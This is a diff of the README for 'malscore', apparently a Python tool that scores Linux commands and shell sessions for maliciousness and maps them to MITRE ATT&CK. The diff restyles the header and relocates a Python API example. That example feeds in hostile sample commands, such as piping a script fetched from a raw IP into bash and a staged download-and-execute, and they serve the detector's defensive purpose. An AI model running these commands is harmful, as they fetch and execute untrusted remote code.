@@ -1,8 +1,18 @@
-# malscore — maliciousness scoring for Linux commands
+<h1 align="center">🦠 malscore</h1>
 
-[![PyPI](https://img.shields.io/pypi/v/malscore.svg)](https://pypi.org/project/malscore/)
-[![Python versions](https://img.shields.io/pypi/pyversions/malscore.svg)](https://pypi.org/project/malscore/)
-[![License](https://img.shields.io/pypi/l/malscore.svg)](LICENSE)
+<p align="center">
+  <b>Maliciousness scoring for Linux commands and shell sessions.</b><br>
+  A 0–100 score with a verdict band and MITRE ATT&CK mapping —
+  computed purely by reading the text, never by executing it.
+</p>
+
+<p align="center">
+  <a href="https://pypi.org/project/malscore/"><img src="https://img.shields.io/pypi/v/malscore.svg" alt="PyPI version"></a>
+  <a href="https://pypi.org/project/malscore/"><img src="https://img.shields.io/badge/python-3.8+-blue.svg" alt="Python 3.8+"></a>
+  <a href="LICENSE"><img src="https://img.shields.io/pypi/l/malscore.svg" alt="License: Apache-2.0"></a>
+  <img src="https://img.shields.io/badge/dependencies-none-brightgreen.svg" alt="Zero dependencies">
+  <img src="https://img.shields.io/badge/MITRE%20ATT%26CK-mapped-C5203E.svg" alt="MITRE ATT&CK mapped">
+</p>
 
 `malscore` takes a Linux command line, or a session of commands such as a shell
 history, and returns a **0–100 maliciousness score** with a verdict band and
@@ -56,6 +66,28 @@ malscore --session history.txt --json
 # gate use: exit code 2 when the verdict is high or critical
 malscore --session history.txt --fail-on high
 ```
+
+## Python API
+
+```python
+from malscore import Analyzer
+
+a = Analyzer()
+r = a.assess_command("curl -s http://1.2.3.4/x.sh | bash")
+print(r.score, r.verdict)                 # 67 high
+print([h.id for h in r.hits])             # ['download_pipe_interpreter', 'raw_ip_url', ...]
+print(r.techniques)                       # ['T1059.004', 'T1105', 'T1071.001']
+
+r = a.assess_session(["curl -o /tmp/p http://1.2.3.4/p", "/tmp/p"])
+print(r.score, [h.id for h in r.hits])    # 75 ['staged_download_execution', ...]
+print([c.score for c in r.per_command])   # each command's own assessment
+print(r.as_dict())                        # JSON-ready
+```
+
+`Analyzer(redact=True)` redacts credential-looking values before any command
+text is echoed back; scores are unaffected.
+
+---
 
 Examples:
 
@@ -210,28 +242,6 @@ The intended production shape is a hybrid:
 | `malscore/signals.py` | weighted, MITRE-mapped signal catalogue |
 | `malscore/scoring.py` | noisy-OR scoring and cross-command session analysis |
 | `malscore/cli.py` | command-line interface (`malscore` / `python -m malscore`) |
-
----
-
-## Python API
-
-```python
-from malscore import Analyzer
-
-a = Analyzer()
-r = a.assess_command("curl -s http://1.2.3.4/x.sh | bash")
-print(r.score, r.verdict)                 # 67 high
-print([h.id for h in r.hits])             # ['download_pipe_interpreter', 'raw_ip_url', ...]
-print(r.techniques)                       # ['T1059.004', 'T1105', 'T1071.001']
-
-r = a.assess_session(["curl -o /tmp/p http://1.2.3.4/p", "/tmp/p"])
-print(r.score, [h.id for h in r.hits])    # 75 ['staged_download_execution', ...]
-print([c.score for c in r.per_command])   # each command's own assessment
-print(r.as_dict())                        # JSON-ready
-```
-
-`Analyzer(redact=True)` redacts credential-looking values before any command
-text is echoed back; scores are unaffected.
 
 ---
 
